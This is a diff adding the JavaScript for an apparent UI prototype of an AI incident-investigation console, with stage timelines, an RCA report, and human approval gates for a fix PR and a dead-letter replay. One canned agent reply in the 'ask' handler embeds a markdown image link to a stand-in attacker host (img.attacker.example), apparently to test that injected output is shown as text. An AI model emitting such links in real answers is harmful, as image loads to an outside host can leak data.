+const DEFAULTS = {human_question:{choice:"Yes, a load test"}, rca_gate:{decision:"approve_fix"}, fix_gate:{decision:"approve", ack_partial_compile:true}, recovery_approval:{decision:"approve", workflow:"replay-dead-letters.yml", batch_size:"500", ack_non_idempotent:true}};
+function jumpTo(reason){
+  restart(false);
+  let guard = 0;
+  while (guard++ < 2000){
+    if (S.interrupt){ if (S.interrupt.reason === reason) break; const p = DEFAULTS[S.interrupt.reason]; S.playing = true; resumeNoRender(p); continue; }
+    if (!S.queue.length) break;
+    apply(S.queue.shift().ev);
+  }
+  S.playing = !S.interrupt; render(); pump();
+}
+function resumeNoRender(p){ renderOff = true; resume(p); renderOff = false; clearTimeout(timer); }
+let renderOff = false;
+function restart(play = true){ clearTimeout(timer); const v = S.variant, sp = S.speed, lg = !document.getElementById("log").hidden; reset(); S.variant = v; S.speed = sp; S.queue = SEG.prefetch().concat(SEG.evidence1()); if (play){ render(); pump(); } }
+
+/* ================= shared render pieces ================= */
+const stageName = id => STAGES.find(s => s[0] === id)[1];
+const STATUS_PILL = {running:["run","running"], awaiting_answer:["you","your answer"], awaiting_rca_gate:["you","RCA gate: your decision"], awaiting_fix_gate:["you","Fix gate: your decision"], awaiting_recovery_approval:["you","Recovery: your approval"], stalled:["bad","stalled"], ended:["ok","ended"]};
+function statusPill(){ const [c,t] = STATUS_PILL[S.stalledStage ? "stalled" : S.status] || ["",S.status]; return h`<span class="pill ${c}">${t}</span>`; }
+function waitTxt(){ if (!S.interruptAt) return ""; const s = Math.floor((Date.now()-S.interruptAt)/1000); return `waiting ${Math.floor(s/60)}m ${String(s%60).padStart(2,"0")}s`; }
+const cites = f => h`<div class="cite">${f.cites.map(c => c.url ? link(c.url, c.label) : h`<span class="chip" title="Backend gave no deep link">${c.label}</span>`)}</div>`;
+function finding(f, opts={}){
+  return h`<div class="finding ${S.selFinding===f.id?"sel":""}" id="f-${f.id}">
+    <div class="row"><span class="fid">${f.id}</span><span class="muted" style="font-size:11px">${stageName(f.stage)}</span></div>
+    <div>${f.claim}</div>${f.quote ? h`<div class="quote">${f.quote}</div>` : ""}${cites(f)}</div>`;
+}
+const fchip = id => h`<button class="chip" data-act="self" data-id="${id}" title="Show evidence">${id}</button>`;
+function header(){
+  return h`<div class="top">
+    <div class="stack" style="gap:2px"><div class="row"><h1>INV-0142 · OrdersApiHighErrorRate</h1>${statusPill()}<span class="muted mono js-wait">${waitTxt()}</span></div>
+    <div class="row muted" style="font-size:12px">${link(GF+"/alerting/OrdersApiHighErrorRate","Alert in Grafana")} · ${link(GH+"/orders-service","orders-service repo")}${S.agent.pr ? h` · ${link(S.agent.pr.url, S.agent.pr.label)}` : ""}</div></div>
+  </div>`;
+}
+function context(){
+  return h`<div class="stack">
+    <dl class="kv"><dt>Service</dt><dd>orders-service</dd><dt>Env</dt><dd>prod-testbed</dd><dt>Source</dt><dd><span class="chip">Alertmanager (Test bed)</span></dd>
+    <dt>Owner</dt><dd>Checkout team</dd><dt>Opened by</dt><dd>R. Operator · 14:12Z</dd><dt>Deployed</dt><dd class="mono">9f3c1e2</dd></dl>
+    <div class="row"><span class="chip">Spring Boot</span><span class="chip">Gradle</span><span class="chip">GitHub</span><span class="chip">Grafana</span></div>
+    ${S.agent.humanContext.length ? h`<div><h2>Your context</h2>${S.agent.humanContext.map(c => h`<div class="quote">${c}</div>`)}</div>` : ""}
+    ${S.status !== "ended" ? controls() : ""}
+  </div>`;
+}
+function controls(){
+  return h`<details><summary>Add context · re-run stage · cancel</summary><div class="stack" style="margin-top:6px">
+    <textarea id="ctx" placeholder="Context for the agent (plain text)">${S.form.ctx||""}</textarea>
+    <div class="row"><button data-act="addctx">Add context</button><button data-act="rerun">Re-run ${S.current ? stageName(S.current) : "stage"}</button>
+    ${S.confirmCancel ? h`<button class="danger" data-act="cancel2">Confirm cancel</button><button data-act="cancel0">Keep going</button>` : h`<button class="danger" data-act="cancel1">Cancel Investigation</button>`}</div></div></details>`;
+}
+function acts(id, max=99){
+  const st = S.stages[id]; const list = st.acts.slice(-max);
+  return list.map(a => h`<div class="act"><span>${a.res ? "✓" : "…"}</span><span><b>${a.name}</b> ${a.args}${a.res ? h` → ${a.res}` : ""}</span></div>`);
+}
+function hypotheses(){
+  const hs = S.agent.hypotheses;
+  if (!hs.length) return h`<div class="muted">Hypotheses appear when the RCA writer runs.</div>`;
+  return hs.map(x => h`<div class="panel stack" style="${x.warn ? "border-color:var(--bad)" : ""}">
+    <div class="row" style="justify-content:space-between"><h3>${x.id} · ${x.headline}</h3><span class="conf ${x.confidence}">${x.confidence}</span></div>
+    <div class="row" style="font-size:12px"><span><b>${x.verified} of ${x.total}</b> evidence verified</span><div class="bar" style="width:90px"><i style="width:${Math.round(100*x.verified/x.total)}%"></i></div>${x.repos.map(r => h`<span class="chip">${r}</span>`)}</div>
+    ${x.warn ? h`<div class="gap">⚠ ${x.warn}</div>` : ""}
+    <details><summary>Details and evidence</summary><div style="margin-top:4px">${x.detail}</div><div class="row" style="margin-top:4px">${x.findings.map(fchip)}</div></details>
+  </div>`);
+}
+function report(compact){
+  const r = S.agent.report;
+  const sum = S.reportStream || (r.summary ?? "");
+  if (!sum) return h`<div class="muted">The RCA report is written after Code-locator.</div>`;
+  return h`<div class="stack">
+    <div class="row"><h2>RCA report v${S.stages.rcawriter.v}</h2>${r.edited ? h`<span class="pill warn">edited by Operator</span>` : ""}${S.stages.rcawriter.status==="running" ? h`<span class="pill run">streaming</span>` : ""}</div>
+    <div style="font-size:15px;max-width:68ch">${sum}</div>
+    ${r.timeline ? h`
+      <div><h2>Timeline</h2><table><tbody>${r.timeline.map(([t,x,f]) => h`<tr><td class="mono">${t}</td><td>${x}</td><td>${fchip(f)}</td></tr>`)}</tbody></table></div>
+      <div><h2>Suspect changes</h2>${r.changes.map(([s,x,f]) => h`<div class="row"><span class="chip">${s}</span>${x}${fchip(f)}</div>`)}</div>
+      <div><h2>Suspect code</h2>${r.locations.map(([f,l]) => h`<div class="row"><span class="mono">${l}</span>${fchip(f)}</div>`)}</div>
+      <div><h2>Impact</h2><div>${r.impact}</div></div>
+      <div><h2>Gaps</h2>${S.agent.gaps.map(g => h`<div class="gap">⚠ ${g.stage}: ${g.text}</div>`)}</div>
+      <div><h2>Next steps</h2><ol style="margin:0;padding-left:18px">${r.next.map(n => h`<li>${n}</li>`)}</ol></div>` : ""}
+    ${S.agent.superseded.length ? h`<details><summary>${S.agent.superseded.length} superseded version(s)</summary>${S.agent.superseded.map(s => h`<div class="stack" style="opacity:.6;margin-top:6px"><div class="muted">v${s.v} — superseded by your revision: “${s.feedback}”</div><div style="text-decoration:line-through">${s.summary}</div></div>`)}</details>` : ""}
+    ${S.status === "ended" ? thread() : ""}
+  </div>`;
+}
+function thread(){
+  return h`<div class="panel stack"><h2>Ask about this RCA</h2>
+    ${S.thread.map(m => h`<div class="stack" style="gap:2px"><div class="muted" style="font-size:11px">${m.who} · about RCA v${m.v}</div><div class="${m.who==="agent"?"quote":""}">${m.text}</div></div>`)}
+    <div class="row" style="flex-wrap:nowrap"><input type="text" id="ask" placeholder="e.g. Why not just add a retry?" value="${S.form.ask||""}"><button data-act="ask">Ask</button></div></div>`;
+}
+function stalledBanner(){
+  if (!S.stalledStage) return "";
+  return h`<div class="banner bad stack"><b>${stageName(S.stalledStage)} stalled: Loki unreachable (connection refused) after 3 retries.</b>
+    <div class="row"><button data-act="unstall">Re-run stage</button><button class="danger" data-act="cancel2">Cancel Investigation</button></div></div>`;
+}
+function endBanner(){ return S.status === "ended" ? h`<div class="banner ok"><b>Investigation ended:</b> ${S.outcome}</div>` : ""; }
+
+/* ================= interrupt cards ================= */
+function choice(name, val, title, sub, primary){
+  return h`<button class="choice ${S.form[name]===val?"on":""} ${primary?"primary-choice":""}" data-act="pick" data-name="${name}" data-val="${val}"><b>${title}</b><small>${sub}</small></button>`;
+}
+function icard(){
+  const it = S.interrupt; if (!it) return "";
+  const head = (title, sub) => h`<div class="ihead"><div class="stack" style="gap:2px"><span class="pill you" style="align-self:flex-start">Your turn</span><h3>${title}</h3><span class="muted" style="font-size:12px">${sub}</span></div><span class="mono muted js-wait">${waitTxt()}</span></div>`;
+  if (it.reason === "human_question"){
+    const p = it.payload;
+    return h`<div class="icard">${head("Question from the agent", `Asked by ${p.stage} · question ${p.n} of max ${p.max} · the Investigation is paused`)}
+      <div style="font-size:15px">${p.question}</div><div class="muted" style="font-size:12px">Why it asks: ${p.why}</div>
+      <div class="choices">${p.options.map(o => choice("choice", o, o, ""))}</div>
+      <textarea id="note" placeholder="Optional note (plain text)">${S.form.note||""}</textarea>
+      <div class="row"><button class="primary" data-act="answer" ${S.form.choice?"":"disabled"}>Send answer</button><span class="muted" style="font-size:12px">Other shapes: yes_no → two buttons · free_text → text box only</span></div></div>`;
+  }
+  if (it.reason === "rca_gate"){
+    const d = S.form.decision, r = S.agent.report, hy = S.agent.hypotheses[0];
+    return h`<div class="icard">${head("RCA gate: approve the root cause?", `Revision ${S.revisions} of 3 · nothing is written until you decide`)}
+      <div class="banner warn">⚠ context_changed since the gate opened: 2 more OrdersApiHighErrorRate alerts fired; deployed commit unchanged (9f3c1e2).</div>
+      ${hy ? h`<div class="row"><b>${hy.id}</b> ${hy.headline} <span class="conf ${hy.confidence}">${hy.confidence}</span><span class="muted" style="font-size:12px">${hy.verified} of ${hy.total} evidence verified</span></div>` : ""}
+      <div class="choices">
+        ${choice("decision","approve_fix","Approve and propose a fix","Fix proposer runs next",true)}
+        ${choice("decision","accept_no_fix","Accept without a fix","Ends with this RCA report")}
+        ${choice("decision","revise","Revise with feedback","RCA writer runs again", false)}
+        ${choice("decision","edit","Edit the report","Your text replaces the summary")}
+        ${choice("decision","abandon","Abandon","Ends; report kept as-is")}
+      </div>
+      ${d === "revise" ? h`<textarea id="feedback" placeholder="What should the RCA writer reconsider? (plain text)">${S.form.feedback||""}</textarea>` : ""}
+      ${d === "edit" ? h`<textarea id="summary" style="min-height:90px">${S.form.summary ?? r.summary}</textarea>` : ""}
+      <div class="row"><button class="primary" data-act="rcadecide" ${!d || (d==="revise" && !S.form.feedback) || (d==="revise" && S.revisions>=3) ? "disabled":""}>Confirm decision</button>${d==="revise" && S.revisions>=3 ? h`<span class="gap">Revision limit reached</span>`:""}</div></div>`;
+  }
+  if (it.reason === "fix_gate"){
+    const d = S.form.decision, ack = S.form.ack;
+    const checks = [["Applies cleanly","pass",""],["Real change (not whitespace/comments)","pass",""],["Forbidden paths (CI config, build scripts)","pass",""],["Secrets","pass",""],["Size ≤ 400 lines","pass","8 lines"],["Banned libraries","pass",""],["Compile","error(environment)","private Maven feed unreachable; partial compile of 2 changed files OK"],["Tests","pass","214 passed"],["Regression test","pass","fails before fix, passes after"]];
+    const cls = s => s==="pass"?"ok":s==="fail"?"bad":s==="skipped"?"":"warn";
+    return h`<div class="icard">${head("Fix gate: open a draft PR with this patch?", `Proposal v${S.stages.fixproposer.v} · fix revision ${S.fixRevisions} of 3 · stop reason: engine finished, all Checks ran`)}
+      <div><h2>orders-service · base a71d0b4 (default-branch HEAD)</h2>
+      <div class="diff">${raw(`<span class="muted">src/main/resources/application.yml</span>
+<span class="del">-    read-timeout: 2s</span>
+<span class="add">+    read-timeout: 5s</span>
+<span class="muted">src/test/java/org/example/orders/InventoryClientTimeoutTest.java (new regression test)</span>
+<span class="add">+  @Test void slowInventoryUnderFiveSecondsDoesNotFail() { … }</span>`)}</div></div>
+      <div class="tablewrap"><table><thead><tr><th>Check</th><th>Result</th><th>Detail</th></tr></thead><tbody>
+        ${checks.map(([n,s,x]) => h`<tr><td>${n}</td><td><span class="pill ${cls(s)}">${s}</span></td><td>${x}</td></tr>`)}</tbody></table></div>
+      <label class="row banner warn" style="cursor:pointer"><input type="checkbox" data-act="ack" ${ack?"checked":""}> I understand compile was partial (environment error) and approve anyway.</label>
+      <dl class="kv">
+        <dt>Impact reach</dt><dd>3 callers of InventoryClient.getStock → POST /orders, PUT /orders/{id} → checkout-web, mobile-bff</dd>
+        <dt>Commits</dt><dd>deployed 9f3c1e2 vs base a71d0b4: 0 between; suspect files unchanged</dd>
+        <dt>Out of scope</dt><dd>none · no build-file or dependency changes</dd>
+        <dt>Fix review</dt><dd><span class="pill warn">1 open, advisory</span> “5 s still exceeds the gateway's 4 s budget for POST /orders” ${link(GH+"/orders-service/blob/a71d0b4/src/main/resources/application.yml#L12","application.yml:12")}</dd>
+      </dl>
+      <div class="choices">
+        ${choice("decision","approve","Approve","Mints write token, opens draft PR",true)}
+        ${choice("decision","revise","Revise","Fix engine tries again")}
+        ${choice("decision","reject","Reject","Ends with the RCA report")}
+        ${choice("decision","back_to_rca","Back to RCA","Re-open the RCA gate")}
+      </div>
+      ${d === "revise" ? h`<textarea id="feedback" placeholder="What should change in the patch?">${S.form.feedback||""}</textarea>` : ""}
+      <div class="row"><button class="primary" data-act="fixdecide" ${!d || (d==="approve" && !ack) ? "disabled":""}>Confirm decision</button>${d==="approve" && !ack ? h`<span class="muted" style="font-size:12px">Acknowledge the partial compile to approve</span>` : ""}</div></div>`;
+  }
+  if (it.reason === "recovery_approval"){
+    const wf = S.form.workflow || "replay-dead-letters.yml", ok = S.form.ack;
+    return h`<div class="icard" style="border-color:var(--bad)">${head("Recovery approval: run a confirmed Recovery workflow?", "Critical Action · dispatch 1 of max 3 · approve or reject only")}
+      <div class="row">${["replay-dead-letters.yml","reprocess-orders.yml"].map(w => choice("workflow", w, w, w===wf && !S.form.workflow ? "suggested" : "confirmed for orders-service"))}</div>
+      <dl class="kv"><dt>Repo / branch</dt><dd class="mono">orders-service @ main (default)</dd><dt>Runbook</dt><dd>${link(GH+"/orders-service/blob/main/docs/runbooks/dlq.md","docs/runbooks/dlq.md")}</dd><dt>Post-check</dt><dd>orders.dlq depth returns to 0 within 15 min</dd></dl>
+      <div class="tablewrap"><table><thead><tr><th>Input</th><th>Value</th><th>Source</th></tr></thead><tbody>
+        <tr><td>service</td><td class="mono">orders-service</td><td>Service registry</td></tr>
+        <tr><td>queue</td><td class="mono">orders.dlq</td><td>Runbook</td></tr>
+        <tr><td>since</td><td class="mono">2026-11-06T14:01Z</td><td>Finding F7</td></tr>
+        <tr><td>batch_size</td><td><select id="batch">${["100","500","1000"].map(b => h`<option ${ (S.form.batch||"500")===b?"selected":""}>${b}</option>`)}</select></td><td>Operator may choose</td></tr>
+      </tbody></table></div>
+      <div class="banner warn">⚠ Not idempotent: replaying twice can create duplicate orders.</div>
+      <label class="row" style="cursor:pointer"><input type="checkbox" data-act="ack" ${ok?"checked":""}> I confirm no other replay is running and accept the duplicate risk.</label>
+      <div class="row"><button class="primary" data-act="recapprove" ${ok?"":"disabled"}>Approve and run</button><button class="danger" data-act="recreject">Reject</button></div>
+      <div class="muted" style="font-size:12px">Blocked state (not shown): “A recovery is already running for orders-service” or “3 of 3 dispatches used”.</div></div>`;
+  }
+}
+function recoveryStatus(){
+  const r = S.agent.recovery; if (!r) return "";
+  return h`<div class="panel stack"><h2>Recovery run · replay-dead-letters.yml</h2><div class="row"><span class="pill ${r.state==="success"?"ok":"run"}">${r.state}</span>${link(GH+"/orders-service/actions/runs/9921","Run #9921")}</div>${r.postcheck ? h`<div>Post-check: ${r.postcheck}</div>` : ""}</div>`;
+}
+const stageFindings = id => S.agent.findings.filter(f => f.stage === id);
+const stageGaps = id => S.agent.gaps.filter(g => g.stage === stageName(id));
+
+/* ================= Variant A: cockpit ================= */
+function VariantA(){
+  const sel = S.sel || "prefetch";
+  const rows = STAGES.map(([id, name]) => {
+    const st = S.stages[id], n = stageFindings(id).length, last = st.acts.at(-1);
+    const stat = S.stalledStage === id ? "stalled" : st.status;
+    return h`<button class="tlrow ${sel===id?"sel":""}" data-act="sel" data-id="${id}"><span class="dot ${stat}"></span><span class="t">
+      <b>${name}${st.v>1 ? h` <span class="muted">v${st.v}</span>` : ""}</b>
+      <span class="muted" style="font-size:12px">${stat==="running" && last ? `${last.name}…` : stat==="waiting" ? "waiting for you" : stat==="pending" ? "" : stat==="skipped" ? "skipped" : GATES[id] ? "decided" : `${n} findings · ${st.acts.length} steps${stat==="incomplete"?" · incomplete":""}`}</span></span></button>`;
+  });
+  let panel;
+  if (S.tab === "findings"){
+    const fs = GATES[sel] ? [] : stageFindings(sel), st = S.stages[sel];
+    panel = h`${S.interrupt ? h`${icard()}<div style="height:10px"></div>` : ""}<div class="panel">
+      <div class="row" style="justify-content:space-between"><h3>${stageName(sel)}</h3><span class="pill ${st.status==="done"?"ok":st.status==="incomplete"?"warn":st.status==="running"?"run":""}">${st.status}</span></div>
+      ${st.acts.length ? h`<details ${st.status==="running"?"open":""} style="margin:6px 0"><summary>${st.acts.length} tool steps</summary>${acts(sel)}</details>` : ""}
+      ${stageGaps(sel).map(g => h`<div class="gap">⚠ Gap: ${g.text}</div>`)}
+      ${fs.length ? fs.map(f => finding(f)) : h`<div class="muted">${GATES[sel] ? "Gate: decisions show in the card above." : "No findings yet."}</div>`}
+      ${sel==="pr" ? recoveryStatus() : ""}</div>`;
+  } else if (S.tab === "hyp") panel = h`${S.interrupt ? h`${icard()}<div style="height:10px"></div>` : ""}<div class="stack">${hypotheses()}</div>`;
+  else panel = h`${S.interrupt ? h`${icard()}<div style="height:10px"></div>` : ""}<div class="panel">${report()}</div>`;
+  return h`${header()}${stalledBanner()}${endBanner()}<div class="A" style="margin-top:10px">
+    <div class="panel"><h2 style="margin-bottom:8px">Context</h2>${context()}</div>
+    <div class="panel"><h2 style="margin-bottom:6px">Stages</h2><div class="tl">${rows}</div>
+      ${S.narr && S.status!=="ended" ? h`<div class="act" style="margin-top:8px;border-top:1px solid var(--line);padding-top:8px"><span>▶</span><span>${S.narr}</span></div>` : ""}</div>
+    <div style="min-width:0"><div><div class="tabs">
+      ${[["findings","Stage findings"],["hyp",`Hypotheses (${S.agent.hypotheses.length})`],["report","RCA report"]].map(([k,l]) => h`<button class="${S.tab===k?"on":""}" data-act="tab" data-id="${k}">${l}</button>`)}</div></div>
+      ${panel}</div>
+  </div>`;
+}
+
+/* ================= Variant B: feed ================= */
+function VariantB(){
+  const items = [];
+  for (const [id, name] of STAGES){
+    const st = S.stages[id]; if (st.status === "pending" && !(S.interrupt && GATES[id] && st.status==="waiting")) continue;
+    if (GATES[id]){ items.push(h`<div class="sh"><span class="dot ${st.status}"></span><b>${name}</b><span class="muted" style="font-size:12px">${st.status==="waiting"?"waiting for you":st.status}</span></div>`); continue; }
+    const fs = stageFindings(id), open = st.status === "running" || !S.form["col_"+id];
+    items.push(h`<div class="sh"><span class="dot ${S.stalledStage===id?"stalled":st.status}"></span><b>${name}${st.v>1?` v${st.v}`:""}</b>
+      <span class="muted" style="font-size:12px">${st.status==="running" ? "running" : `${fs.length} findings · ${st.acts.length} steps${st.status==="incomplete"?" · incomplete":""}`}</span>
+      ${st.status!=="running" ? h`<button class="chip" data-act="col" data-id="${id}">${open?"collapse":"expand"}</button>` : ""}</div>
+      ${open ? h`<div class="entry">${st.status==="running" ? acts(id) : h`<details><summary>${st.acts.length} tool steps</summary>${acts(id)}</details>`}
+        ${stageGaps(id).map(g => h`<div class="gap">⚠ Gap: ${g.text}</div>`)}
+        ${fs.length ? h`<div class="panel">${fs.map(f => finding(f))}</div>` : ""}
+        ${id==="rcawriter" ? h`<div class="panel">${report()}</div><div class="stack">${hypotheses()}</div>` : ""}
+        ${id==="pr" ? recoveryStatus() : ""}</div>` : ""}`);
+  }
+  const stepper = STAGES.map(([id,n]) => h`<span class="pill ${S.stages[id].status==="done"?"ok":S.stages[id].status==="running"?"run":S.stages[id].status==="waiting"?"you":S.stages[id].status==="incomplete"?"warn":""}">${n}</span>`);
+  return h`<div class="B">${header()}<div class="stepper">${stepper}</div>${stalledBanner()}
+    <details class="panel"><summary>Context: orders-service · prod-testbed · Checkout team · opened by R. Operator</summary><div style="margin-top:8px">${context()}</div></details>
+    ${items}
+    ${S.narr && S.status!=="ended" && !S.interrupt ? h`<div class="act"><span>▶</span><span>${S.narr}</span></div>` : ""}
+    ${icard()}${endBanner()}${S.status==="ended" && S.stages.rcawriter.status==="done" ? "" : ""}</div>`;
+}
+
+/* ================= Variant C: report-first ================= */
+function VariantC(){
+  const r = S.agent.report, sum = S.reportStream || r.summary;
+  const step = STAGES.map(([id,n]) => { const st = S.stages[id]; return h`<div class="step ${S.current===id||st.status==="waiting"?"cur":""}"><span class="dot ${S.stalledStage===id?"stalled":st.status}"></span>${n}${stageFindings(id).length?h` <span class="muted">${stageFindings(id).length}</span>`:""}</div>`; });
+  const sec = (title, body, pendingTxt) => h`<section><h2>${title}</h2>${body || h`<div class="pending">${pendingTxt}</div>`}</section>`;
+  const fs = S.agent.findings;
+  const doc = h`<div class="panel doc">
+    <div class="row" style="justify-content:space-between"><h3>RCA report ${sum ? `v${S.stages.rcawriter.v}` : "(draft)"}</h3>${r.edited ? h`<span class="pill warn">edited by Operator</span>`:""}</div>
+    ${sec("Summary", sum ? h`<div style="font-size:16px;max-width:68ch">${sum}</div>` : "", "Written by the RCA writer once evidence is in.")}
+    ${sec("Hypotheses", S.agent.hypotheses.length ? h`<div class="stack">${hypotheses()}</div>` : "", "")}
+    ${!r.timeline ? sec("Evidence so far", fs.length ? h`<div class="stack">${fs.map(f => h`<div class="row" style="flex-wrap:nowrap;align-items:flex-start">${fchip(f.id)}<span>${f.claim}</span></div>`)}</div>` : "", "Waiting for Pre-fetch.") : ""}
+    ${r.timeline ? h`
+      ${sec("Timeline", h`<table><tbody>${r.timeline.map(([t,x,f]) => h`<tr><td class="mono">${t}</td><td>${x}</td><td>${fchip(f)}</td></tr>`)}</tbody></table>`)}
+      ${sec("Suspect changes", r.changes.map(([s,x,f]) => h`<div class="row"><span class="chip">${s}</span>${x}${fchip(f)}</div>`))}
+      ${sec("Suspect code", r.locations.map(([f,l]) => h`<div class="row"><span class="mono">${l}</span>${fchip(f)}</div>`))}
+      ${sec("Impact", h`<div>${r.impact}</div>`)}
+      ${sec("Gaps", S.agent.gaps.map(g => h`<div class="gap">⚠ ${g.stage}: ${g.text}</div>`))}
+      ${sec("Next steps", h`<ol style="margin:0;padding-left:18px">${r.next.map(n => h`<li>${n}</li>`)}</ol>`)}` : ""}
+    ${S.agent.superseded.length ? h`<details><summary>${S.agent.superseded.length} superseded version(s)</summary>${S.agent.superseded.map(s => h`<div style="opacity:.6;margin-top:6px"><div class="muted">v${s.v}: “${s.feedback}”</div><s>${s.summary}</s></div>`)}</details>` : ""}
+    ${recoveryStatus()}
+    ${S.status === "ended" ? thread() : ""}
+  </div>`;
+  const selF = fs.find(f => f.id === S.selFinding);
+  const drawer = h`<div class="panel drawer stack"><h2>Evidence</h2>
+    ${selF ? finding(selF) : h`<div class="muted" style="font-size:12px">Click any F-chip to see its claim and citations.</div>`}
+    <details ${selF?"":"open"}><summary>All ${fs.length} findings</summary>${fs.map(f => finding(f))}</details>
+    ${S.agent.gaps.map(g => h`<div class="gap">⚠ Gap (${g.stage}): ${g.text}</div>`)}
+    <details><summary>Context</summary>${context()}</details></div>`;
+  return h`${header()}<div class="C"><div class="stepper">${step}</div>
+    <div class="ticker">${S.status==="ended" ? "" : S.narr ? `▶ ${S.narr}` : ""}</div>
+    <div style="grid-column:1/-1">${stalledBanner()}${endBanner()}</div>
+    ${doc}${drawer}
+    ${S.interrupt ? h`<div class="sheet">${icard()}</div>` : ""}</div>`;
+}
+
+/* ================= render + chrome ================= */
+const NAMES = {A:"Cockpit", B:"Feed", C:"Report-first"};
+function render(){
+  if (renderOff) return;
+  const app = document.getElementById("app");
+  const v = S.variant;
+  app.innerHTML = emit(v === "A" ? VariantA() : v === "B" ? VariantB() : VariantC());
+  document.getElementById("proto").innerHTML = emit(h`
+    <button data-act="prev" title="Previous layout (←)">◀</button><span class="lbl">${v} · ${NAMES[v]}</span><button data-act="next" title="Next layout (→)">▶</button>
+    <span class="sep"></span><button data-act="play">${S.playing && !S.interrupt ? "⏸" : "▶ play"}</button>
+    ${[1,3,10].map(x => h`<button class="${S.speed===x?"on":""}" data-act="speed" data-id="${x}">${x}×</button>`)}
+    <span class="sep"></span><span>Jump:</span>
+    <button data-act="jump" data-id="human_question">Question</button><button data-act="jump" data-id="rca_gate">RCA gate</button>
+    <button data-act="jump" data-id="fix_gate">Fix gate</button><button data-act="jump" data-id="recovery_approval">Recovery</button>
+    <button data-act="stall" title="Simulate an observability backend outage in the running stage">Backend down</button>
+    <button data-act="restart">Restart</button><button data-act="log">Events</button>`);
+  const lg = document.getElementById("log");
+  if (!lg.hidden){ lg.innerHTML = emit(S.log.slice(-80).map(e => h`<div class="${e.dir==="out"?"out":""}">${e.dir==="out"?"→ ":"← "}${JSON.stringify(e)}</div>`)); lg.scrollTop = lg.scrollHeight; }
+}
+setInterval(() => { const t = waitTxt(); document.querySelectorAll(".js-wait").forEach(e => e.textContent = t); }, 1000);
+
+document.addEventListener("input", e => { if (e.target.id) S.form[e.target.id] = e.target.value; if (e.target.id==="feedback") { const b = document.querySelector('[data-act="rcadecide"],[data-act="fixdecide"]'); if (b && S.form.decision==="revise") b.disabled = !e.target.value; } });
+document.addEventListener("change", e => { if (e.target.id === "batch") S.form.batch = e.target.value; });
+document.addEventListener("click", e => {
+  const b = e.target.closest("[data-act]"); if (!b) return;
+  const a = b.dataset.act, id = b.dataset.id, V = "ABC";
+  const go = d => { S.variant = V[(V.indexOf(S.variant)+d+3)%3]; try{ history.replaceState(null,"","#"+S.variant); }catch{} };
+  switch(a){
+    case "prev": go(-1); break; case "next": go(1); break;
+    case "play": if (!S.interrupt){ S.playing = !S.playing; pump(); } break;
+    case "speed": S.speed = +id; pump(); break;
+    case "jump": jumpTo(id); return;
+    case "restart": restart(); return;
+    case "log": { const l = document.getElementById("log"); l.hidden = !l.hidden; break; }
+    case "stall": if (S.current && S.stages[S.current].status === "running"){ S.stalledStage = S.current; clearTimeout(timer); } break;
+    case "unstall": clientSend({type:"human_event", kind:"rerun_stage", stage:S.stalledStage}); S.stalledStage = null; pump(); break;
+    case "sel": S.sel = id; S.tab = "findings"; break;
+    case "tab": S.tab = id; break;
+    case "self": S.selFinding = id; if (S.variant==="A"){ const f = S.agent.findings.find(x=>x.id===id); if (f){ S.sel = f.stage; S.tab = "findings"; } } break;
+    case "col": S.form["col_"+id] = !S.form["col_"+id]; break;
+    case "pick": S.form[b.dataset.name] = b.dataset.val; break;
+    case "ack": S.form.ack = b.checked; break;
+    case "answer": resume({choice:S.form.choice, note:S.form.note||""}); return;
+    case "rcadecide": resume({decision:S.form.decision, feedback:S.form.feedback||"", summary:S.form.summary ?? S.agent.report.summary}); return;
+    case "fixdecide": resume({decision:S.form.decision, ack_partial_compile:!!S.form.ack, feedback:S.form.feedback||""}); return;
+    case "recapprove": resume({decision:"approve", workflow:S.form.workflow||"replay-dead-letters.yml", batch_size:S.form.batch||"500", ack_non_idempotent:true}); return;
+    case "recreject": resume({decision:"reject"}); return;
+    case "addctx": if (S.form.ctx){ S.agent.humanContext.push(S.form.ctx); clientSend({type:"human_event", kind:"add_context", text:S.form.ctx}); S.form.ctx = ""; } break;
+    case "rerun": clientSend({type:"human_event", kind:"rerun_stage", stage:S.current}); break;
+    case "cancel1": S.confirmCancel = true; break; case "cancel0": S.confirmCancel = false; break;
+    case "cancel2": clientSend({type:"human_event", kind:"cancel"}); S.queue = []; S.interrupt = null; S.stalledStage = null; S.status = "ended"; S.outcome = "Cancelled by R. Operator"; clearTimeout(timer); break;
+    case "ask": if (S.form.ask){ const v = S.stages.rcawriter.v; S.thread.push({who:"R. Operator", v, text:S.form.ask});
+      S.thread.push({who:"agent", v, text:"A retry would mask it: each retry waits 2 s again and inventory p99 is 2.1 s, so most retries also time out (F4). Restoring ≥5 s fixes the cause. More: ![chart](https://img.attacker.example/x.png) (shown as text; never loaded)"}); S.form.ask = ""; } break;
+  }
+  render();
+});
+document.addEventListener("keydown", e => {
+  if (e.target.closest("input,textarea,select,[contenteditable]")) return;
+  if (e.key === "ArrowLeft" || e.key === "ArrowRight"){ const V="ABC"; S.variant = V[(V.indexOf(S.variant)+(e.key==="ArrowLeft"?-1:1)+3)%3]; try{ history.replaceState(null,"","#"+S.variant); }catch{} render(); }
+});
+window.addEventListener("hashchange", () => { const v = location.hash.replace("#","").toUpperCase(); if ("ABC".includes(v) && v) { S.variant = v; render(); } });
+
+reset(); restart();
+</script>
